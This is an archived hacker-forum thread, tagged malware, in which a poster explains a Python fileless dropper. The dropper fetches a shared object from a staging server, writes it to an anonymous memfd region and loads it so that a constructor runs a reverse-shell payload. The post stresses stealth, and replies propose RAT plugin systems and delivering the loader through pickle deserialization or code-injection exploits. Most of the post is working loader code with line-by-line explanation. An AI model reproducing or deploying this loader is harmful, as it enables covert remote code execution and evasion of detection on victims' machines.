@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Pure python in memory SO loading without shm - #3 by 0x00pf - Programming - 0x00sec - The Home of the Hacker</title>
+<meta name="description" content="https://github.com/nullbites/SnakeEater 
+A few months ago I wrote up a silly project to implement purely in memory SO (shared object) loading via the memfd_create syscall. I forgot to include y’all in the fun and I am so&amp;hellip;">
+<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
+<link rel="icon" type="image/png" href="../../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
+<link rel="apple-touch-icon" type="image/png" href="../../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
+<meta name="theme-color" media="all" content="#171616">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
+<link rel="canonical" href="../6453.html" />
+<link rel="search" type="application/opensearchdescription+xml" href="../../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
+<link href="../../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
+<link href="../../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
+<link href="../../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
+<link href="../../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
+<link href="../../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
+<link href="../../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
+<link href="../../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
+<link href="../../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
+<link href="../../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
+<link href="../../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
+<link href="../../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
+<link href="../../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
+<link href="../../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
+<link href="../../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
+<link href="../../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
+<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
+<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
+<link rel="preload" href="../../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
+<script defer src="../../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
+<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;Pure python in memory SO loading without shm&#39;" href="../6453.rss" />
+<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
+<meta property="og:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
+<meta property="og:url" content="https://0x00sec.org/t/pure-python-in-memory-so-loading-without-shm/6453/3" />
+<meta name="twitter:url" content="https://0x00sec.org/t/pure-python-in-memory-so-loading-without-shm/6453/3" />
+<meta property="og:title" content="Pure python in memory SO loading without shm" />
+<meta name="twitter:title" content="Pure python in memory SO loading without shm" />
+<meta property="og:description" content="It looks more like this: Super Stealthy Droppers, but loading a library, instead of running a binary 😜" />
+<meta name="twitter:description" content="It looks more like this: Super Stealthy Droppers, but loading a library, instead of running a binary 😜" />
+<meta property="og:article:section" content="Programming" />
+<meta property="og:article:section:color" content="92278F" />
+<meta property="og:article:tag" content="linux" />
+<meta property="og:article:tag" content="malware" />
+<meta property="og:article:tag" content="python" />
+<meta property="article:published_time" content="2018-04-27T19:31:57+00:00" />
+<meta property="og:ignore_canonical" content="true" />
+</head>
+<body class="crawler ">
+<div id="top-navbar" class="container">
+<span id="top-navbar-links" style="display:none;">
+
+<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
+<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
+<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
+</span>
+</div>
+<header>
+<a href="../../../index.html">
+0x00sec - The Home of the Hacker
+</a>
+</header>
+<div id="main-outlet" class="wrap" role="main">
+<div id="topic-title">
+<h1>
+<a href="../6453.html">Pure python in memory SO loading without shm</a>
+</h1>
+<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
+<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
+<a href="../../../c/programming/61.html" class="badge-wrapper bullet" itemprop="item">
+<span class="badge-category-bg" style="background-color: #92278F"></span>
+<span class="badge-category clear-badge">
+<span class="category-name" itemprop="name">Programming</span>
+</span>
+</a>
+<meta itemprop="position" content="1" />
+</span>
+</div>
+<div class="topic-category">
+<div class="discourse-tags list-tags">
+<a href="../../../tag/linux.html" class="discourse-tag" rel="tag">linux</a>,
+<a href="../../../tag/malware.html" class="discourse-tag" rel="tag">malware</a>,
+<a href="../../../tag/python.html" class="discourse-tag" rel="tag">python</a>
+</div>
+</div>
+</div>
+<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
+<meta itemprop="headline" content="Pure python in memory SO loading without shm">
+<meta itemprop="articleSection" content="Programming">
+<meta itemprop="keywords" content="linux, malware, python">
+<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+<meta itemprop="name" content="0x00sec - The Home of the Hacker">
+<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
+<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
+</div>
+</div>
+<div id="post_1" class="topic-body crawler-post">
+<div class="crawler-post-meta">
+<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
+<a itemprop="url" href="https://0x00sec.org/u/nullbites"><span itemprop="name">nullbites</span></a>
+</span>
+<link itemprop="mainEntityOfPage" href="../6453.html">
+<span class="crawler-post-infos">
+<time itemprop="datePublished" datetime="2018-04-26T19:27:19Z" class="post-time">
+April 26, 2018, 7:27pm
+</time>
+<meta itemprop="dateModified" content="2018-04-26T19:27:19Z">
+<span itemprop="position">1</span>
+</span>
+</div>
+<div class="post" itemprop="articleBody">
+<aside class="onebox allowlistedgeneric">
+<header class="source">
+<img src="https://github.githubassets.com/favicons/favicon.svg" class="site-icon" width="32" height="32">
+<a href="https://github.com/nullbites/SnakeEater" target="_blank" rel="noopener nofollow ugc">GitHub</a>
+</header>
+<article class="onebox-body">
+<img src="https://0x00sec.s3.amazonaws.com/original/2X/0/05b52ea00c632495ab480a7c0cfd2eeecc243ecc.png" class="thumbnail onebox-avatar" width="202" height="202">
+<h3><a href="https://github.com/nullbites/SnakeEater" target="_blank" rel="noopener nofollow ugc">nullbites/SnakeEater</a></h3>
+<p>Python implementation of the reflective SO injection technique - nullbites/SnakeEater</p>
+</article>
+<div class="onebox-metadata">
+</div>
+<div style="clear: both"></div>
+</aside>
+<p>A few months ago I wrote up a silly project to implement purely in memory SO (shared object) loading via the memfd_create syscall. I forgot to include y’all in the fun and I am sorry <img src="../../../images/emoji/twitter/frowning.png%3Fv=9" title=":frowning:" class="emoji" alt=":frowning:">.</p>
+<p>Sho’ nuff’ this is possible in just a few lines of python. I wrote it up as a class and it still is less than 20 LoC. The payload is a basic bitch 3dup rev shell.</p>
+<p>Let’s go over how it works.</p>
+<pre><code>class SnakeEaterLoader:
+def __init__(self):
+    # modify 
+    self.url = "http://127.0.0.1:8080/module1.so"
+    # just to force it to int (lazy)
+    self.fd = 0
+
+def get_memfd(self):
+    # python one liners are so pretty ain't they?
+
+    # use ctypes to get our anon page and corosponding fd
+    self.fd = ctypes.CDLL(None).syscall(MEMFD_CREATE_NO,"/tmp/none",1)
+
+def write_so(self):
+    getter = urllib.request
+    # open connection to stage server
+    resp = getter.urlopen(self.url)
+    if resp.status != 200: # verify
+        print("could not contact callback server")
+        exit(1)
+    # get remote so
+    # hosting encrypted and decrypting
+    # here would be pretty easy, but W/E
+    data = resp.read()
+    # write the so to our memfd created
+    # page
+    os.write(self.fd,data)
+
+
+def open_so(self):
+    # here be magic
+    path = "/proc/self/fd/" + str(self.fd)
+    ctypes.CDLL(path) #.dlopen(path,1) &lt;-- doesn't fuckin work
+</code></pre>
+<p>I’m pretty sure if I wrote the algorithm out it would actually be valid python so lets just look at the class that provides the implementation</p>
+<p>‘__int__’ sets up the variables for the callback URL and the class field ‘fd’. FD here is the file descriptor that will correspond to the memory region where out SO is loaded. But chill for a second. We are getting ahead of ourselves.</p>
+<p>Why do we need these file descriptors and shit like that? Can’t we just read the SO into memory and use the shellcode function pointer trick to run it?</p>
+<p>Nope.</p>
+<p>Turns out a SO file has headers and shit that make it not behave like shellcode (imagine that). I’m sure you could parse the ELF header and find the entry point, then start execution at the parsed entrypoint; but that sounds like a fucking drag. If we can get the in-memory SO loading working it will make it easier to produce payloads as we don’t have to deal with shellcode conversion and weird NX and DEP rules.</p>
+<p>That and there is no un-explained huge memory map just sitting somewhere. With this technique the SO file actually loads into the process in a very normal looking way.</p>
+<p>So, enough yammering. Time for how it do.</p>
+<p>Python is elegant in such that it gives you access to very low level interfaces in a way that is both elegant and easy to understand.</p>
+<pre><code>self.fd = ctypes.CDLL(None).syscall(MEMFD_CREATE_NO,"/tmp/none",1)
+</code></pre>
+<p>Let’s explain this</p>
+<p>Ctypes is a default python library that provides an interface to interact with DLLs in windows and with SOs in Linux/UNIX systems. Were not using it to load out SO (yet) but we are using it to call memfd_create. This provides us with a file descriptor that corresponds to a chunk of our own processes memory.</p>
+<p>Now we just use urllib and os.write to write out our SO to memory</p>
+<p>urllib gets the data:</p>
+<pre><code>resp = getter.urlopen(self.url)
+if resp.status != 200: # verify
+    print("could not contact callback server")
+    exit(1)
+# get remote so
+# hosting encrypted and decrypting
+# here would be pretty easy, but W/E
+data = resp.read()  # plain data
+</code></pre>
+<p>and os.write() writes that raw data to memory</p>
+<pre><code>os.write(self.fd,data)
+</code></pre>
+<p>Now that we have a SO loaded into memory and a valid file descriptor corosponding to it, it’s just a matter of what we want to do with it.</p>
+<p>We could ptrace it into another process or we can just load it into ours. Doing so is as simple as this:</p>
+<pre><code>def open_so(self):
+    # here be magic
+    path = "/proc/self/fd/" + str(self.fd)
+    ctypes.CDLL(path)
+</code></pre>
+<p>We just access the file decriptor from our own procfs entry and load it with ‘ctypes.CDLL(path)’</p>
+<p>In our SO file we have our malware’s startup function act as the default constructor. So even though we haven’t called any functions in the SO file it has still executed code to “set up it’s own internal data structures” and whatnot.</p>
+<p>That is demonstrated below and it fairly intuitive.</p>
+<pre><code>void __attribute__ ((constructor)) init_eater(void);
+
+void init_eater()
+{
+    .... malware and shit
+}</code></pre>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
+<meta itemprop="userInteractionCount" content="10" />
+<span class="post-likes">10 Likes</span>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
+<meta itemprop="userInteractionCount" content="0" />
+</div>
+</div>
+<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
+<div class="crawler-post-meta">
+<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
+<a itemprop="url" href="https://0x00sec.org/u/oaktree"><span itemprop="name">oaktree</span></a>
+(oaktree)
+</span>
+<link itemprop="mainEntityOfPage" href="../6453.html">
+<span class="crawler-post-infos">
+<time itemprop="datePublished" datetime="2018-04-27T17:48:08Z" class="post-time">
+April 27, 2018, 5:48pm
+</time>
+<meta itemprop="dateModified" content="2018-04-27T17:48:08Z">
+<span itemprop="position">2</span>
+</span>
+</div>
+<div class="post" itemprop="text">
+<p>Hmm, is this like what I showed in my article <a href="../../c-dynamic-loading-of-shared-objects-at-runtime/1498.html" class="inline-onebox">[C++] Dynamic Loading of Shared Objects at Runtime</a> ?</p>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
+<meta itemprop="userInteractionCount" content="1" />
+<span class="post-likes">1 Like</span>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
+<meta itemprop="userInteractionCount" content="2" />
+</div>
+</div>
+<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
+<div class="crawler-post-meta">
+<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
+<a itemprop="url" href="https://0x00sec.org/u/0x00pf"><span itemprop="name">0x00pf</span></a>
+(pico)
+</span>
+<link itemprop="mainEntityOfPage" href="../6453.html">
+<span class="crawler-post-infos">
+<time itemprop="datePublished" datetime="2018-04-27T19:31:57Z" class="post-time">
+April 27, 2018, 7:31pm
+</time>
+<meta itemprop="dateModified" content="2018-04-27T19:31:57Z">
+<span itemprop="position">3</span>
+</span>
+</div>
+<div class="post" itemprop="text">
+<p>It looks more like this: <a href="../../super-stealthy-droppers/3715.html">Super Stealthy Droppers</a>, but loading a library, instead of running a binary <img src="../../../images/emoji/twitter/stuck_out_tongue_winking_eye.png%3Fv=9" title=":stuck_out_tongue_winking_eye:" class="emoji" alt=":stuck_out_tongue_winking_eye:"></p>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
+<meta itemprop="userInteractionCount" content="4" />
+<span class="post-likes">4 Likes</span>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
+<meta itemprop="userInteractionCount" content="1" />
+</div>
+</div>
+<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
+<div class="crawler-post-meta">
+<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
+<a itemprop="url" href="https://0x00sec.org/u/nullbites"><span itemprop="name">nullbites</span></a>
+</span>
+<link itemprop="mainEntityOfPage" href="../6453.html">
+<span class="crawler-post-infos">
+<time itemprop="datePublished" datetime="2018-05-04T14:47:17Z" class="post-time">
+May 4, 2018, 2:47pm
+</time>
+<meta itemprop="dateModified" content="2018-05-04T14:47:17Z">
+<span itemprop="position">4</span>
+</span>
+</div>
+<div class="post" itemprop="text">
+<p>Hell yeah dude. We need to get together and write up a “plugin-system” for warez and RATs. Seems like a fun way to play with c++ execution/memory management.</p>
+<p>I wonder if there is any way to agnosticly load a class that is formatted to be a plugin. That way the plugin author only has to implement a RunPlugin() method in their class and it can do it’s own field (state for example) and thread management (like what a socks proxy would need).</p>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
+<meta itemprop="userInteractionCount" content="0" />
+<span class="post-likes"></span>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
+<meta itemprop="userInteractionCount" content="1" />
+</div>
+</div>
+<div id="post_5" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
+<div class="crawler-post-meta">
+<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
+<a itemprop="url" href="https://0x00sec.org/u/nullbites"><span itemprop="name">nullbites</span></a>
+</span>
+<link itemprop="mainEntityOfPage" href="../6453.html">
+<span class="crawler-post-infos">
+<time itemprop="datePublished" datetime="2018-05-04T14:51:01Z" class="post-time">
+May 4, 2018, 2:51pm
+</time>
+<meta itemprop="dateModified" content="2018-05-04T14:51:01Z">
+<span itemprop="position">5</span>
+</span>
+</div>
+<div class="post" itemprop="text">
+<p>I was thinking that a pickle (or otherwise serialized) version of this technique could be used as a extremely stealthy payload for an serialization exploit. Either that or if there is python command/code injection this could be one-liner’d over to take advantage of currently loaded imports to get stealthy execution on a vulnerable server.</p>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
+<meta itemprop="userInteractionCount" content="1" />
+<span class="post-likes">1 Like</span>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
+<meta itemprop="userInteractionCount" content="0" />
+</div>
+</div>
+<div id="post_6" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
+<div class="crawler-post-meta">
+<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
+<a itemprop="url" href="https://0x00sec.org/u/system"><span itemprop="name">system</span></a>
+(system)
+Closed
+</span>
+<link itemprop="mainEntityOfPage" href="../6453.html">
+<span class="crawler-post-infos">
+<time itemprop="datePublished" datetime="2018-05-26T19:31:28Z" class="post-time">
+May 26, 2018, 7:31pm
+</time>
+<meta itemprop="dateModified" content="2018-05-26T19:31:28Z">
+<span itemprop="position">6</span>
+</span>
+</div>
+<div class="post" itemprop="text">
+<p>This topic was automatically closed after 30 days. New replies are no longer allowed.</p>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
+<meta itemprop="userInteractionCount" content="0" />
+<span class="post-likes"></span>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
+<meta itemprop="userInteractionCount" content="0" />
+</div>
+</div>
+<div id="post_7" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
+<div class="crawler-post-meta">
+<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
+<a itemprop="url" href="https://0x00sec.org/u/oaktree"><span itemprop="name">oaktree</span></a>
+(oaktree)
+</span>
+<link itemprop="mainEntityOfPage" href="../6453.html">
+<span class="crawler-post-infos">
+<time itemprop="datePublished" datetime="2018-06-09T16:19:55Z" class="post-time">
+June 9, 2018, 4:19pm
+</time>
+<meta itemprop="dateModified" content="2018-06-09T16:19:55Z">
+<span itemprop="position">7</span>
+</span>
+</div>
+<div class="post" itemprop="text">
+<p>You have your plugin class extend an abstract class, and then create a factory function to instantiate the plugin.</p>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
+<meta itemprop="userInteractionCount" content="0" />
+<span class="post-likes"></span>
+</div>
+<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
+<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
+<meta itemprop="userInteractionCount" content="0" />
+</div>
+</div>
+</div>
+</div>
+<footer class="container wrap">
+<nav class="crawler-nav">
+<ul>
+<li itemscope itemtype="http://schema.org/SiteNavigationElement">
+<span itemprop="name">
+<a href="../../../index.html" itemprop="url">Home </a>
+</span>
+</li>
+<li itemscope itemtype="http://schema.org/SiteNavigationElement">
+<span itemprop="name">
+<a href="../../../categories.html" itemprop="url">Categories </a>
+</span>
+</li>
+<li itemscope itemtype="http://schema.org/SiteNavigationElement">
+<span itemprop="name">
+<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
+</span>
+</li>
+<li itemscope itemtype="http://schema.org/SiteNavigationElement">
+<span itemprop="name">
+<a href="../../../tos.html" itemprop="url">Terms of Service </a>
+</span>
+</li>
+<li itemscope itemtype="http://schema.org/SiteNavigationElement">
+<span itemprop="name">
+<a href="../../../privacy.html" itemprop="url">Privacy Policy </a>
+</span>
+</li>
+</ul>
+</nav>
+<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
+</footer>
+<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+</body>
+</html>
